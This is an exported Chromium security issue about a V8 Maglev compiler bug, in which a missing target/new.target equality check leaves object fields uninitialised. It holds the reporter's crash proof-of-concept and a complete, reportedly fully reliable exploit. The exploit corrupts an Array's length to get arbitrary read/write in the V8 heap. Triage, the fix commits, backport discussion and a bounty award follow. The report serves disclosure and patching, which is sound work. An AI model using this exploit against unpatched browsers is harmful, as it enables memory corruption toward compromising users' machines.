# Maglev's handling of target and new.target is incorrect

| Field | Value |
|-------|-------|
| **Issue ID** | [467247247](https://issues.chromium.org/issues/467247247) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | jg...@chromium.org |
| **Created** | 2025-12-09 |
| **Bounty** | $50,000.00 |

## Description

VULNERABILITY DETAILS

The issue is in Maglev's constructor handling. During interpreted execution, an `Object` object is created. When executed with Maglev optimization, a malformed `WeakMap` object is created. The node that creates this object is as follows:

```
      19: RootConstant(empty_fixed_array), 4 uses
      17: RootConstant(one_pointer_filler_map), 2 uses

     Block b4
      37 : 72 f4 f9 00 01    Construct r5, r0-r0, FBV[1]
      39: AllocationBlock(Young), 1 uses
      40: InlinedAllocation(object 0x09b101022315 <Map[16](HOLEY_ELEMENTS)>) [n39], 6 uses (5 non escaping uses)
      41: StoreMap(0x09b101022315 <Map[16](HOLEY_ELEMENTS)>, InlinedAllocation) [n40]
      42: StoreTaggedFieldNoWriteBarrier(0x4) [n40, n19]
      43: StoreTaggedFieldNoWriteBarrier(0x8) [n40, n19]
      44: StoreTaggedFieldNoWriteBarrier(0xc) [n40, n17]

```

The `table` field of this object is not initialized correctly. It seems that Maglev has a problem when handling `target` and `new.target`. If this is not a duplicate issue, I will provide a more detailed analysis.

REPRODUCTION CASE

poc.js:

```
class C extends Object {
    constructor() {
        for (let i = 0; i < 5; i++) {
            if (!i) {
                super();
            }
        }
    }
}
function opt_me() {
    // Reflect.construct(target, argumentsList, newTarget)
    return Reflect.construct(C, [], WeakMap);
}

// For Ignition, an Object object is created.
opt_me();
opt_me();
opt_me();
opt_me();
opt_me();
// After Maglev optimizing compilation, a WeakMap object is created,
// and its `table` field is `one_pointer_filler_map`.
let obj = opt_me();

// Using this WeakMap object will trigger a crash.
obj.set({}, 123);


```

V8 must be built with a debug configuration, Execute v8 as follows:

```
./d8 \
    --predictable \
    --jit-fuzzing \
    ./poc.js

```

This will result in the following crash:

```
#
# Fatal error in ../../src/objects/object-type.cc, line 82
# Type cast failed in CAST(LoadObjectField(collection, JSWeakCollection::kTableOffset)) at ../../src/builtins/builtins-collections-gen.cc:2861
.....

```

CREDIT INFORMATION

Reporter credit: [303f06e3]

## Timeline

### ch...@google.com (2025-12-09)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### cl...@appspot.gserviceaccount.com (2025-12-09)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4879223793582080.

### cl...@appspot.gserviceaccount.com (2025-12-09)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5938468559454208.

### li...@chromium.org (2025-12-09)

Clusterfuzz entry from [crbug.com/467247247](https://crbug.com/467247247)#comment4 matches the crash from the description. It fails during a type cast. I've tentatively set some fields in the bug and am reassigning to V8 shepherd @md...@google.com for further triage.

### 24...@project.gserviceaccount.com (2025-12-09)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2025-12-09)

Detailed Report: https://clusterfuzz.com/testcase?key=5938468559454208

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: Fatal error
Crash Address: 
Crash State:
  Type cast failed in CAST(LoadObjectField(collection, JSWeakCollection::kTableOff
  v8::internal::CheckObjectType
  Builtins_WeakCollectionSet
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=103848:103849

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5938468559454208

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### md...@google.com (2025-12-10)

Assigning to Jakob as Clusterfuzz points to his CL.

### hu...@gmail.com (2025-12-10)

Hello, I have conducted a more detailed analysis of this vulnerability and successfully exploited it.

## 1 Root Cause

The vulnerability occurs in Maglev's handling of constructors. The call stack is as follows:

1. `MaglevGraphBuilder::VisitConstruct()`: Entry point for handling the `Construct` bytecode, which calls `BuildConstruct()` for processing.
2. `BuildConstruct()`: Retrieves the `new.target` node from the Feedback Slot; if `target` is a constant node, it calls `TryReduceConstruct()` for optimization.
3. `TryReduceConstruct()`: If `target` is a `Builtin`, it calls `TryReduceConstructBuiltin()` for optimization.
4. `TryReduceConstructBuiltin()`: The optimization process for `Builtin::kObjectConstructor` is as follows.

```
MaybeReduceResult MaglevGraphBuilder::TryReduceConstructBuiltin(
    compiler::JSFunctionRef target_function,
    compiler::SharedFunctionInfoRef target_sfi, ValueNode* target,
    ValueNode* new_target, CallArguments& args) {


  switch (target_sfi.builtin_id()) {
    case Builtin::kArrayConstructor: ...
    case Builtin::kObjectConstructor: {

      // new_target_function is <JSFunction WeakMap ... >
      compiler::OptionalJSFunctionRef new_target_function = TryGetConstant<JSFunction>(new_target);

      if (args.count() == 0 && // since `C.constructor()` has no arguments, this is 0
          new_target_function.has_value() &&    // new_target_function is specified
          new_target_function->has_initial_map(broker()) // new_target_function has an initial_map
      ) {
        // Create object based on new_target_function->initial_map
        return BuildInlinedAllocation(
            CreateJSConstructor(new_target_function.value()),
            AllocationType::kYoung);
      }
      break;
    }
    case ...
  }
  return {};
}

```

`CreateJSConstructor()` creates an object based on `constructor.initial_map`, but only initializes three fields: `map`, `properties`, and `elements`.

```
VirtualObject* MaglevGraphBuilder::CreateJSConstructor(
    compiler::JSFunctionRef constructor) {
  using Shape = VirtualJSObjectShape;

  compiler::SlackTrackingPrediction prediction =
      broker()->dependencies()->DependOnInitialMapInstanceSizePrediction(
          constructor);
  compiler::MapRef map = constructor.initial_map(broker());

  // Create a new object:
  // vobj->map is constructor.initial_map
  // Object size is initial_map.instance_size
  int slot_count = prediction.instance_size() / kTaggedSize;
  SBXCHECK_GE(slot_count, 3);
  VirtualObject* vobj = NodeBase::New<VirtualObject>(
      zone(), 0, NewObjectId(), this, &Shape::kObjectLayout, map, slot_count);

  // But here only three fields of JSObject are initialized: map, properties, and elements
  vobj->set(HeapObject::kMapOffset, GetConstant(map));
  vobj->set(JSObject::kPropertiesOrHashOffset,
            GetRootConstant(RootIndex::kEmptyFixedArray));
  vobj->set(JSObject::kElementsOffset,
            GetRootConstant(RootIndex::kEmptyFixedArray));

  return vobj;
}

```

Summary of this optimization strategy:

- If the `target` of `Construct` is `Object`, the constructor has no arguments, and `new_target` is a constructor with an `initial_map`,
- Then an object is created based on `new_target->initial_map`, as follows:
  
  - Object size is `new_target->initial_map->instance_size`
  - Map is `new_target->initial_map`
  - `properties` and `elements` are `kEmptyFixedArray`
  - Fields other than those of `JSObject` are not initialized. For uninitialized fields, `VirtualObject` defaults the field value to `RootConstant(one_pointer_filler_map)`.

We can observe that `CreateJSConstructor()` actually creates a `JSObject` but uses `new_target->initial_map` as the `Map`. **If `new_target->initial_map` is a subclass of `JSObject`, such as `WeakMap`, the additional fields in the subclass will fail to be correctly initialized.**

Therefore, this optimization is only valid when `target` and `new_target` are the same. When they differ, the object should be created based on `target` and then set `__proto__` according to `new_target`. However, there is no check for whether `target` equals `new_target`, leading to the vulnerability.

## 2 Commit

I believe the vulnerability was introduced in commit `2efc4fc7971a6fcaa0a3a27ea935da4a2f963ebf`, which removed the check for equality between `target` and `new_target` in `TryReduceConstructBuiltin()` and created the object based on `new_target`.

```
@@ -12754,18 +12736,18 @@ MaybeReduceResult MaglevGraphBuilder::TryReduceConstructBuiltin(
       break;
     }
     case Builtin::kObjectConstructor: {
-      // TODO(jgruber): Implement.
-      if (target != new_target) return {};
       // If no value is passed, we can immediately lower to a simple
       // constructor.
-      if (args.count() == 0) {
-        return BuildInlinedAllocation(CreateJSConstructor(target_function),
-                                      AllocationType::kYoung);
+      compiler::OptionalJSFunctionRef new_target_function =
+          TryGetConstant<JSFunction>(new_target);
+      if (args.count() == 0 && new_target_function.has_value()) {
+        return BuildInlinedAllocation(
+            CreateJSConstructor(new_target_function.value()),
+            AllocationType::kYoung);
       }
       break;
     }

```

Additionally, the commit message mentions that this commit introduced `templated TryGetConstant`, which should have been just code refactoring but modified JIT optimization checks, which is confusing.

I noticed that commit `db821356970fa76853e8c6cd5f41d4cd35c581b5` attempted to fix a similar issue. This commit checks whether `new_target_function` has an `initial_map`, but it does not ensure `target == new_target`.

Moreover, the `regress-463405539.js` in this commit is very similar to the POC I submitted, but it does not actually use the created object, so it failed to uncover this deeper issue.

```
@@ -12889,7 +12889,8 @@ MaybeReduceResult MaglevGraphBuilder::TryReduceConstructBuiltin(
       // constructor.
       compiler::OptionalJSFunctionRef new_target_function =
           TryGetConstant<JSFunction>(new_target);
-      if (args.count() == 0 && new_target_function.has_value()) {
+      if (args.count() == 0 && new_target_function.has_value() &&
+          new_target_function->has_initial_map(broker())) {
         return BuildInlinedAllocation(
             CreateJSConstructor(new_target_function.value()),
             AllocationType::kYoung);

```
## 3 More Explicit POC

I have modified the original POC to make it more explicit.

```
class OptMe extends Object {
    constructor() {
        super();
    }
}

function callOptMe() {
    // Reflect.construct(target, argumentsList, newTarget)
    return Reflect.construct(OptMe, [], WeakMap);
}

// For Ignition, an Object object is created.
%PrepareFunctionForOptimization(OptMe);
callOptMe();
callOptMe();
callOptMe();
%OptimizeMaglevOnNextCall(OptMe);
// After Maglev optimizing compilation, a WeakMap object is created,
// and its `table` field is `one_pointer_filler_map`.
let obj = callOptMe();

// Using this WeakMap object will trigger a crash.
obj.set({}, 123);

```

Executing the following will produce the same crash as before.

```
./d8 \
    --allow-natives-syntax \
    ./poc.js

```
## 4 How To Exploit

This vulnerability incorrectly initializes fields in subclasses of `JSObject` as `RootConstant(one_pointer_filler_map)` when creating objects of those subclasses.

The key point lies in the selection of `newTarget`, which must meet the following conditions:

- It must be a built-in JS constructor because custom constructors are essentially `JSObject`.
- It must have an `initial_map`.
- The `initial_map` must have more than 3 fields, so that incorrect initialization occurs.

Considering all built-in JS constructors: the most exploitable is the built-in `Array` constructor because `new Array()` creates a `JSArray` object with one more field (`length`) than `JSObject`. If this field is not correctly initialized, it will retain a very large value, i.e., `RootConstant(one_pointer_filler_map)`, making it very easy to achieve arbitrary read/write in the V8 Heap.

Replacing `WeakMap` with `JSArray` creates the following object:

```
DebugPrint: 0x9b10104b201: [JSArray]
 - map: 0x09b10100c6e1 <Map[16](PACKED_SMI_ELEMENTS)> [FastProperties]
 - prototype: 0x09b10100c709 <JSArray[0]>
 - elements: 0x09b1000007bd <FixedArray[0]> [PACKED_SMI_ELEMENTS]
 - length: 0x09b10000058d <Map[4](FILLER_TYPE)>  <=== Corrupt
 - properties: 0x09b1000007bd <FixedArray[0]>

```

At this point, `evilArr->elements` points to a `FixedArray[0]` in `ReadOnly Space`. If we directly execute `evilArr[0]=1`, since `evilArray>1`, `Ignition` assumes sufficient memory and will directly write to `evilArr->elements[0]`, causing a segmentation fault.

Here, I will use the same technique as in `issues/386565144`: implementing Array Elements Backing Store Expansion via Turbofan. Consider the following function:

```
function expand_array(arr) {
    arr[0] = 1.1;
}
%PrepareFunctionForOptimization(expand_array);
expand_array(new Array());
expand_array(new Array());
expand_array(new Array());
%OptimizeFunctionOnNextCall(expand_array);
expand_array(new Array());

```

The optimized `expand_array` will determine whether to execute `GrowFastElements` based on `evilArr->elements->length`. Since this field is `0`, it will reallocate a `FixedArray` object in the `V8 Heap` for us and increment `evilArr->length`.

## 5 Exploit

The complete exploit is as follows:

```
/*======= prepare JITed Functions =======*/
function expand_array(arr) {
    arr[0] = 1.1;
}
%PrepareFunctionForOptimization(expand_array);
expand_array(new Array());
expand_array(new Array());
expand_array(new Array());
%OptimizeFunctionOnNextCall(expand_array);
expand_array(new Array());


/*======= trigger vuln =======*/
class OptMe extends Object {
    constructor() {
        super();
    }
}

function callOptMe() {
    // Reflect.construct(target, argumentsList, newTarget)
    return Reflect.construct(OptMe, [], Array);
}

%PrepareFunctionForOptimization(OptMe);
callOptMe();
callOptMe();
callOptMe();
/*
    For Maglev optimization, an object is created based on Array->initial_map. The specific process is:
        1. evilArr = Allocate(YoungSpace, 0x10)
        2. evilArr->map = Array->initial_map
        3. evilArr->properties = empty_fixed_array
        4. evilArr->elements = empty_fixed_array
    The evilArr->length field is not initialized, so VirtualObject will default it to RootConstant(one_pointer_filler_map).
*/
%OptimizeMaglevOnNextCall(OptMe);
let evilArr = callOptMe();
%DebugPrint(evilArr);


/*======= OOB W/R =======*/
/*
    Using the expand_array function, the optimized `expand_array` will determine whether to execute `GrowFastElements` based on `evilArr->elements->length`.
    Since this field is `0`, it will reallocate a `FixedArray` object in the `V8 Heap` for us and set `evilArr->length++`.
*/
expand_array(evilArr);
%DebugPrint(evilArr);

// Now we can arbitrarily read and write the entire V8 Heap through `evilArr`
print(evilArr[10]);
%SystemBreak();

```

Running the following in a release-compiled d8 achieves arbitrary read/write in the V8 Heap:

```
./d8 \
    --allow-natives-syntax \
    ./poc.js

```

This exploit is very stable because it does not require any heap grooming or offsets; it succeeds 100% of the time.

### jg...@chromium.org (2025-12-10)

Thank you, looking.

### jg...@chromium.org (2025-12-10)

What a silly bug, thanks for reporting that. I agree this shouldn't have been a drive-by change. A fix is in flight that reverts to the correct behavior which only inlines the 0 arg Object ctor.

### ch...@google.com (2025-12-10)

Setting milestone because of s0/s1 severity.

### dx...@google.com (2025-12-10)

Project: v8/v8  

Branch:  main  

Author:  Jakob Linke [jgruber@chromium.org](mailto:jgruber@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7246733>

[maglev] Revert invalid Object ctor optimization

---


Expand for full commit details
```
     
    CreateJSConstructor only handles map/properties/elements initialization 
    and thus cannot handle arbitrary types. 
     
    Originally introduced in 
    https://chromium-review.googlesource.com/c/v8/v8/+/7172508 
     
    Fixed: 467247247 
    Change-Id: I10cb497b8838376c21577ec922421bec5f20441a 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7246733 
    Commit-Queue: Jakob Linke <jgruber@chromium.org> 
    Auto-Submit: Jakob Linke <jgruber@chromium.org> 
    Reviewed-by: Victor Gomes <victorgomes@chromium.org> 
    Commit-Queue: Victor Gomes <victorgomes@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#104237}

```

---

Files:

- M `src/maglev/maglev-graph-builder.cc`
- A `test/mjsunit/regress/regress-467247247.js`

---

Hash: [5e8f6ad085a7e4a2e7a71b64722f9707b1d4ade9](https://chromiumdash.appspot.com/commit/5e8f6ad085a7e4a2e7a71b64722f9707b1d4ade9)  

Date: Wed Dec 10 11:59:47 2025


---

### ch...@google.com (2025-12-10)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M142. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M143. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M144. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: a reverted commit was detected after the merge request.

Security Merge Request - Manual Review: Merge review required: a reverted commit was detected after the merge request.

Security Merge Request - Manual Review: Merge review required: a reverted commit was detected after the merge request.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [142, 143, 144].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### jg...@chromium.org (2025-12-10)

The bug was introduced in 144: <https://chromiumdash.appspot.com/commit/2efc4fc7971a6fcaa0a3a27ea935da4a2f963ebf>

### jg...@chromium.org (2025-12-10)

> Which CLs should be backmerged? (Please include Gerrit links.)

<https://chromium-review.googlesource.com/7246733>

> Has this fix been verified on Canary to not pose any stability regressions?

Not yet.

> Does this fix pose any potential non-verifiable stability risks?
> Does this fix pose any known compatibility risks?
> Does it require manual verification by the test team? If so, please describe required testing.

No

### jg...@chromium.org (2025-12-12)

> Has this fix been verified on Canary to not pose any stability regressions?

Now released on 7574, looking good.

### pe...@google.com (2025-12-12)

The NextAction date has arrived: 2025-12-12
To opt-out from this automation rule, please add Optout-Blintz-Nextaction-Alert to the "Chromium Labels" custom field.

### ya...@chromium.org (2025-12-12)

Please proceed with the merge

### dx...@google.com (2025-12-15)

Project: v8/v8  

Branch:  refs/branch-heads/14.4  

Author:  Jakob Linke [jgruber@chromium.org](mailto:jgruber@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7257797>

Merged: [maglev] Revert invalid Object ctor optimization

---


Expand for full commit details
```
     
    CreateJSConstructor only handles map/properties/elements initialization 
    and thus cannot handle arbitrary types. 
     
    Originally introduced in 
    https://chromium-review.googlesource.com/c/v8/v8/+/7172508 
     
    (cherry picked from commit 5e8f6ad085a7e4a2e7a71b64722f9707b1d4ade9) 
     
    Bug: 467247247 
    Change-Id: I10cb497b8838376c21577ec922421bec5f20441a 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7246733 
    Commit-Queue: Jakob Linke <jgruber@chromium.org> 
    Auto-Submit: Jakob Linke <jgruber@chromium.org> 
    Reviewed-by: Victor Gomes <victorgomes@chromium.org> 
    Commit-Queue: Victor Gomes <victorgomes@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#104237} 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7257797 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/14.4@{#20} 
    Cr-Branched-From: 80acc26727d5a34e77dabeebe7c9213ec1bd4768-refs/heads/14.4.258@{#1} 
    Cr-Branched-From: ce7e597e90f6df3fa4b6df224bc613b80c635450-refs/heads/main@{#104020}

```

---

Files:

- M `src/maglev/maglev-graph-builder.cc`
- A `test/mjsunit/regress/regress-467247247.js`

---

Hash: [eb00360d025585af11bae15bc5e8c319d4f1b26f](https://chromiumdash.appspot.com/commit/eb00360d025585af11bae15bc5e8c319d4f1b26f)  

Date: Wed Dec 10 11:59:47 2025


---

### pe...@google.com (2025-12-15)

LTS Milestone M138

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### dx...@google.com (2025-12-15)

Project: v8/v8  

Branch:  main  

Author:  Jakob Linke [jgruber@chromium.org](mailto:jgruber@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7246101>

[maglev] Harden against incomplete vobj initializations

---


Expand for full commit details
```
     
    This changes the VirtualObject constructor to initialize slots to 
    kUninitializedSlotValue (= nullptr). BuildInlinedAllocation checks 
    that all slots have been initialized. 
     
    Bug: 467247247 
    Change-Id: I9875307751fe667163be9559976675047b10c792 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7246101 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Commit-Queue: Jakob Linke <jgruber@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#104311}

```

---

Files:

- M `src/maglev/maglev-graph-builder.cc`
- M `src/maglev/maglev-ir.cc`
- M `src/maglev/maglev-ir.h`
- M `test/mjsunit/regress/regress-467247247.js`

---

Hash: [52c481a71b55eca6cc8e6a56f5471b7ea4618348](https://chromiumdash.appspot.com/commit/52c481a71b55eca6cc8e6a56f5471b7ea4618348)  

Date: Mon Dec 15 08:07:31 2025


---

### go...@google.com (2025-12-15)

Please merge your change to M144 by 10:00 AM  PT tomorrow, Dec 16th so we can take it in for this week's last beta release before the holiday release freeze. Thank you.

### sr...@chromium.org (2025-12-15)

We are cutting the final beta RC before holidays tomorrow around 1pm PST, please make sure all your merges are in before that time so this change goes to beta release before holidays Kick in, 

Jan first week we have stable RC cut for 144, and we dont plan on any releases during release freeze 

### jg...@chromium.org (2025-12-16)

Merged yesterday, see [comment #20](https://issues.chromium.org/issues/467247247#comment20).

### ml...@chromium.org (2025-12-16)

Labels here are quite off again... This is found on M144 and has not reached stable.

### rz...@google.com (2025-12-16)

Labelling as not applicable for M138 LTS, the issue was introduced in 144 (see [comment #15](https://issues.chromium.org/issues/467247247#comment15))

### sp...@google.com (2025-12-18)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $50000.00 for this report.

Rationale for this decision:
High-quality report demonstrating controlled write in a sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-03-19)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> High-quality report demonstrating controlled write in a sandboxed process

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/467247247)*
